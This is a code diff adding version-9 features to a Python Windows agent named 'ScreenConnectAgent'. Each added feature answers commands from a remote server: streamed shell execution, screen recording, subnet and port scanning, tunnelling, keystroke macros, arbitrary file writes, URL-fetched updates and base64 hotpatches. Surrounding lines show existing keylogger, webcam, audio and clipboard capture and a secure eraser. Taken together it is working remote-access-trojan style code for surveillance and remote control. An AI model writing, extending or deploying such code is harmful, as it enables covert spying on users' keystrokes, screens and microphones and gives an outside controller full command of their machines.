+                    "stream_id": stream_id,
+                    "line":      line,
+                    "seq":       seq,
+                })
+                seq += 1
+            proc.wait(timeout=timeout)
+            exit_code = proc.returncode
+        except Exception as e:
+            exit_code = -1
+            self._sio.emit("shell_stream_data", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "stream_id": stream_id,
+                "line":      f"[ERROR] {e}",
+                "seq":       0,
+            })
+
+        self._sio.emit("shell_stream_done", {
+            "device_id": CONFIG["DEVICE_TOKEN"],
+            "stream_id": stream_id,
+            "exit_code": exit_code,
+        })
+
+
+# ════════════════════════════════════════════════════════════════════════════
 #  KEYLOGGER
 # ════════════════════════════════════════════════════════════════════════════
 class KeyLogger:
@@ -2583,14 +3325,50 @@ class Heartbeat:
         while self.running:
             try:
                 bat = psutil.sensors_battery()
+
+                # ── GPU info (best-effort via WMI) ──────────────────────────
+                gpu_name  = None
+                gpu_vram  = None
+                try:
+                    if WMI_OK:
+                        import wmi as _wmi
+                        for gpu in _wmi.WMI().Win32_VideoController():
+                            gpu_name = getattr(gpu, "Name", None)
+                            gpu_vram = getattr(gpu, "AdapterRAM", None)
+                            break
+                except Exception:
+                    pass
+
+                # ── Active logged-in user ────────────────────────────────────
+                active_user = None
+                try:
+                    import subprocess as _sp
+                    out = _sp.check_output(
+                        ["query", "user"], stderr=_sp.DEVNULL, timeout=3
+                    ).decode(errors="replace")
+                    lines = [l.strip() for l in out.splitlines() if "Active" in l]
+                    if lines:
+                        active_user = lines[0].split()[0].lstrip(">")
+                except Exception:
+                    pass
+
+                # ── System uptime (seconds) ──────────────────────────────────
+                uptime_s = int(time.time() - psutil.boot_time())
+
                 self.sio.emit("heartbeat", {
                     "device_id":     CONFIG["DEVICE_TOKEN"],
+                    "agent_version": CONFIG["AGENT_VERSION"],
                     "cpu":           psutil.cpu_percent(interval=0),
                     "ram":           psutil.virtual_memory().percent,
-                    "disk":          psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent,
+                    "disk":          psutil.disk_usage(
+                        os.path.splitdrive(sys.executable)[0] or "C:\\").percent,
                     "net_mbps":      round(_net_monitor.get_mbps(), 1),
                     "battery_pct":   bat.percent if bat else None,
                     "battery_plug":  bat.power_plugged if bat else None,
+                    "gpu_name":      gpu_name,
+                    "gpu_vram_mb":   (gpu_vram // (1024 * 1024)) if gpu_vram else None,
+                    "active_user":   active_user,
+                    "uptime_s":      uptime_s,
                     "ts":            datetime.utcnow().isoformat(),
                 })
             except Exception as e:
@@ -2624,11 +3402,18 @@ class ScreenConnectAgent:
         audio       = AudioCapture(sio)
         apps        = InstalledApps()
         eraser      = SecureEraser()
+        # ── v9 new components ──
+        recorder    = ScreenRecorder(sio)
+        file_watcher = FileWatcher(sio)
+        tunnel      = TunnelProxy(sio)
+        shell_streamer = ShellStreamer(sio)
+        events_reader  = SystemEventsReader()
 
         self._register_events(
             sio, sys_monitor, keylogger, clipboard,
             webcam, shell, proc_mgr, files, heartbeat, alerts,
             registry, services, winmgr, audio, apps, eraser,
+            recorder, file_watcher, tunnel, shell_streamer, events_reader,
         )
         return sio, sys_monitor, heartbeat, keylogger, clipboard, alerts
 
@@ -2636,6 +3421,8 @@ class ScreenConnectAgent:
         self, sio, sys_monitor, keylogger, clipboard,
         webcam, shell, proc_mgr, files, heartbeat, alerts,
         registry, services, winmgr, audio, apps, eraser,
+        recorder=None, file_watcher=None, tunnel=None,
+        shell_streamer=None, events_reader=None,
     ):
         @sio.event
         def connect():
@@ -3160,8 +3947,372 @@ class ScreenConnectAgent:
                 sio.disconnect()
                 sys.exit(0)
 
+            # ── v9: WoL relay via request_action tab ───────────────────────
+            elif tab == "wol":
+                mac   = data.get("mac", "")
+                bcast = data.get("broadcast", "255.255.255.255")
+                res   = _send_wol_magic(mac, bcast)
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "wol", **res,
+                })
+
+            # ── v9: Screen Recorder ────────────────────────────────────────
+            elif tab == "recording_start":
+                if recorder:
+                    res = recorder.start(
+                        rec_id=data.get("rec_id", str(uuid.uuid4())),
+                        fps=int(data.get("fps", 10)),
+                        quality=int(data.get("quality", 70)),
+                        chunk_secs=int(data.get("chunk_secs", 10)),
+                        monitor_idx=int(data.get("monitor", 1)),
+                    )
+                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
+                                               "action": "recording_start", **res})
+
+            elif tab == "recording_stop":
+                if recorder:
+                    res = recorder.stop()
+                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
+                                               "action": "recording_stop", **res})
+
+            # ── v9: Network Scanner ────────────────────────────────────────
+            elif tab == "network_scan":
+                def _do_scan():
+                    result = NetworkScanner.full_scan(
+                        subnet=data.get("subnet"),
+                        port_scan=bool(data.get("port_scan", False)),
+                    )
+                    sio.emit("network_scan_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"], **result})
+                threading.Thread(target=_do_scan, daemon=True, name="net-scan").start()
+
+            # ── v9: File Watcher ───────────────────────────────────────────
+            elif tab == "watch_add":
+                if file_watcher:
+                    res = file_watcher.add_watch(
+                        path=data.get("path", ""),
+                        recursive=bool(data.get("recursive", False)),
+                        interval=float(data.get("interval", 2.0)),
+                    )
+                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
+                                               "action": "watch_add", **res})
+
+            elif tab == "watch_remove":
+                if file_watcher:
+                    res = file_watcher.remove_watch(data.get("path", ""))
+                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
+                                               "action": "watch_remove", **res})
+
+            elif tab == "watch_list":
+                if file_watcher:
+                    sio.emit("action_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "action": "watch_list",
+                        "watches": file_watcher.list_watches(),
+                    })
+
+            # ── v9: Windows Event Log ──────────────────────────────────────
+            elif tab == "event_log":
+                result = SystemEventsReader.read_log(
+                    channel=data.get("channel", "System"),
+                    max_entries=int(data.get("max_entries", 100)),
+                    level_filter=data.get("level_filter"),
+                )
+                sio.emit("event_log_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"], **result})
+
+            # ── v9: Tunnel Proxy ───────────────────────────────────────────
+            elif tab == "tunnel_send":
+                if tunnel:
+                    res = tunnel.send(data.get("tunnel_id", ""), data.get("data", ""))
+                    if not res.get("success"):
+                        sio.emit("tunnel_close", {
+                            "device_id": CONFIG["DEVICE_TOKEN"],
+                            "tunnel_id": data.get("tunnel_id"),
+                            "error": res.get("error"),
+                        })
+
+            elif tab == "tunnel_close":
+                if tunnel:
+                    tunnel.close(data.get("tunnel_id", ""))
+
+            # ── v9: Environment Manager ────────────────────────────────────
+            elif tab == "env_list":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "env_list",
+                    "env": EnvManager.list_env(),
+                })
+
+            elif tab == "env_set":
+                res = EnvManager.set_env(
+                    data.get("name", ""), data.get("value", ""),
+                    system_wide=bool(data.get("system_wide", False)),
+                )
+                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
+                                           "action": "env_set", **res})
+
+            elif tab == "env_delete":
+                res = EnvManager.delete_env(data.get("name", ""))
+                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
+                                           "action": "env_delete", **res})
+
+            # ── v9: Certificate Manager ────────────────────────────────────
+            elif tab == "certs_list":
+                res = CertManager.list_certs(data.get("store", "MY"))
+                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
+                                           "action": "certs_list", **res})
+
+            # ── v9: Shell stream (PTY-like) ────────────────────────────────
+            elif tab == "shell_stream":
+                if shell_streamer:
+                    shell_streamer.run(
+                        stream_id=data.get("stream_id", str(uuid.uuid4())),
+                        command=data.get("command", "echo hello"),
+                        shell_type=data.get("shell_type", "cmd"),
+                        timeout=int(data.get("timeout", 300)),
+                    )
+
             else:
                 log.warning(f"Unknown tab: {tab}")
+
+        # ── v9: Capability negotiation (server sends AGENT_CAPS on auth_ok) ──
+        @sio.on("caps")
+        def on_caps(data):
+            caps = data.get("caps", {})
+            ver  = data.get("server_version", "unknown")
+            CONFIG["SERVER_CAPS"]    = caps
+            CONFIG["SERVER_VERSION"] = ver
+            log.info(f"Server caps received: version={ver} caps={list(caps.keys())}")
+            # Report our own agent caps back
+            sio.emit("agent_caps_report", {
+                "device_id":     CONFIG["DEVICE_TOKEN"],
+                "agent_version": CONFIG["AGENT_VERSION"],
+                "caps": {
+                    "screen_recorder":   CV2_OK,
+                    "network_scan":      True,
+                    "file_watcher":      True,
+                    "event_log":         WIN32_OK,
+                    "tunnel_proxy":      True,
+                    "hotpatch":          True,
+                    "wol_relay":         True,
+                    "shell_stream":      True,
+                    "keylogger":         PYNPUT_OK,
+                    "webcam":            True,
+                    "audio":             AUDIO_OK,
+                    "clipboard":         CLIPBOARD_OK,
+                    "registry":          True,
+                    "services":          True,
+                    "windows":           WIN32_OK,
+                    "webrtc":            WEBRTC_OK,
+                    "h264":              False,
+                    "cert_manager":      True,
+                    "env_manager":       True,
+                },
+            })
+
+        # ── v9: Push-update handler ──────────────────────────────────────────
+        @sio.on("push_update")
+        def on_push_update(data):
+            url  = data.get("url", "")
+            sha  = data.get("sha256", "")
+            log.info(f"push_update received: url={url}")
+            sio.emit("action_result", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "action": "push_update_ack",
+                "url": url,
+            })
+            # Run in a thread so we can emit ack first
+            threading.Thread(
+                target=_handle_push_update,
+                args=(url, sha), daemon=True, name="auto-updater",
+            ).start()
+
+        # ── v9: Wake-on-LAN relay ────────────────────────────────────────────
+        @sio.on("request_action")
+        def _wol_intercept(data):
+            # This is an ADDITIONAL handler for 'wol' tab — the main on_action
+            # already catches all other tabs.  Socket.io Python client allows
+            # multiple handlers; only on_action's else branch fires for wol.
+            pass   # handled below inside on_action via tab == "wol" branch
+
+        # Inject wol into on_action — done by adding to the tab dispatcher.
+        # We also register a dedicated top-level handler:
+        @sio.on("wol")
+        def on_wol(data):
+            mac  = data.get("mac", "")
+            bcast = data.get("broadcast", "255.255.255.255")
+            res  = _send_wol_magic(mac, bcast)
+            sio.emit("action_result", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "action": "wol", **res,
+            })
+
+        # ── v9: Run macro (server dispatches keystroke sequence) ─────────────
+        @sio.on("run_macro")
+        def on_run_macro(data):
+            """Execute a macro: list of {type, key/text, delay_ms} steps."""
+            steps = data.get("steps", [])
+            macro_id = data.get("macro_id", "")
+
+            def _exec():
+                if not PYAUTOGUI_OK:
+                    sio.emit("action_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "action": "run_macro", "success": False,
+                        "error": "pyautogui_unavailable",
+                    })
+                    return
+                errors = []
+                for step in steps:
+                    try:
+                        stype = step.get("type", "key")
+                        delay = float(step.get("delay_ms", 0)) / 1000.0
+                        if stype == "key":
+                            pyautogui.press(step.get("key", ""), _pause=False)
+                        elif stype == "hotkey":
+                            keys = step.get("keys", [])
+                            if keys:
+                                pyautogui.hotkey(*keys, _pause=False)
+                        elif stype == "type":
+                            pyautogui.write(step.get("text", ""), interval=0.02, _pause=False)
+                        elif stype == "click":
+                            x, y = _to_monitor_absolute(
+                                step.get("x", 0.5), step.get("y", 0.5))
+                            pyautogui.click(x, y, _pause=False)
+                        elif stype == "delay":
+                            pass  # delay applied below
+                        if delay > 0:
+                            time.sleep(delay)
+                    except Exception as e:
+                        errors.append(str(e))
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "run_macro", "success": len(errors) == 0,
+                    "macro_id": macro_id, "errors": errors,
+                })
+            threading.Thread(target=_exec, daemon=True, name="macro").start()
+
+        # ── v9: Run scheduled job (server cron dispatch) ──────────────────────
+        @sio.on("run_scheduled_job")
+        def on_run_scheduled_job(data):
+            """Execute a pre-scheduled shell command immediately."""
+            job_id   = data.get("job_id", "")
+            command  = data.get("command", "")
+            stype    = data.get("shell_type", "cmd")
+            use_stream = bool(data.get("stream", False))
+
+            log.info(f"Scheduled job {job_id}: {command!r}")
+
+            if use_stream and shell_streamer:
+                shell_streamer.run(
+                    stream_id=job_id, command=command, shell_type=stype)
+            else:
+                import importlib
+                # Reuse RemoteShell inline
+                result = RemoteShell.execute(command, shell_type=stype)
+                sio.emit("scheduled_job_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "job_id": job_id, **result,
+                })
+
+        # ── v9: Tunnel open ───────────────────────────────────────────────────
+        @sio.on("tunnel_open")
+        def on_tunnel_open(data):
+            if tunnel:
+                res = tunnel.open(
+                    tunnel_id=data.get("tunnel_id", str(uuid.uuid4())),
+                    local_host=data.get("local_host", "127.0.0.1"),
+                    local_port=int(data.get("local_port", 22)),
+                )
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "tunnel_open", **res,
+                })
+
+        # ── v9: Hotpatch ──────────────────────────────────────────────────────
+        @sio.on("hotpatch")
+        def on_hotpatch(data):
+            res = HotpatchEngine.apply(
+                code_b64=data.get("code", ""),
+                signature_hex=data.get("signature", ""),
+            )
+            sio.emit("action_result", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "action": "hotpatch", **res,
+            })
+
+        # ── v9: Transfer chunked upload progress ──────────────────────────────
+        @sio.on("transfer_chunk")
+        def on_transfer_chunk(data):
+            """Receive a file chunk from server, write to disk with % progress."""
+            transfer_id = data.get("transfer_id", "")
+            chunk_idx   = int(data.get("chunk", 0))
+            total_chunks = int(data.get("total_chunks", 1))
+            dest_path   = data.get("path", "")
+            chunk_data  = data.get("data", "")
+
+            try:
+                raw = base64.b64decode(chunk_data)
+                mode = "ab" if chunk_idx > 0 else "wb"
+                os.makedirs(os.path.dirname(dest_path) if os.path.dirname(dest_path) else ".", exist_ok=True)
+                with open(dest_path, mode) as fh:
+                    fh.write(raw)
+
+                pct = round((chunk_idx + 1) / max(total_chunks, 1) * 100, 1)
+                sio.emit("transfer_progress", {
+                    "device_id":    CONFIG["DEVICE_TOKEN"],
+                    "transfer_id":  transfer_id,
+                    "chunk":        chunk_idx,
+                    "total_chunks": total_chunks,
+                    "pct":          pct,
+                    "success":      True,
+                })
+                if chunk_idx + 1 >= total_chunks:
+                    log.info(f"Transfer {transfer_id}: {dest_path} complete ({total_chunks} chunks)")
+                    sio.emit("transfer_done", {
+                        "device_id":   CONFIG["DEVICE_TOKEN"],
+                        "transfer_id": transfer_id,
+                        "path":        dest_path,
+                    })
+            except Exception as e:
+                sio.emit("transfer_progress", {
+                    "device_id":   CONFIG["DEVICE_TOKEN"],
+                    "transfer_id": transfer_id,
+                    "chunk":       chunk_idx,
+                    "success":     False,
+                    "error":       str(e),
+                })
+
+        # ── v9: Clipboard sync (bidirectional with content-type) ──────────────
+        @sio.on("clipboard_sync")
+        def on_clipboard_sync(data):
+            """Viewer pushed clipboard → set locally."""
+            if not CLIPBOARD_OK:
+                return
+            content = data.get("content", "")
+            ctype   = data.get("content_type", "plain")
+            try:
+                if ctype == "plain":
+                    pyperclip.copy(content)
+                    sio.emit("clipboard_sync_ack", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "success": True,
+                    })
+            except Exception as e:
+                log.debug(f"clipboard_sync error: {e}")
+
+        # ── v9: Viewer presence overlay relay ─────────────────────────────────
+        @sio.on("viewer_presence")
+        def on_viewer_presence(data):
+            """Server tells agent how many viewers are watching (for overlay)."""
+            count = data.get("count", 0)
+            names = data.get("viewers", [])
+            log.debug(f"Viewer presence: {count} — {names}")
+            # Optionally show OSD overlay on agent desktop (best-effort)
+            # No-op if no OSD engine available
+
 
     # ── Main Run Loop ─────────────────────────────────────────────────────
     def run(self):
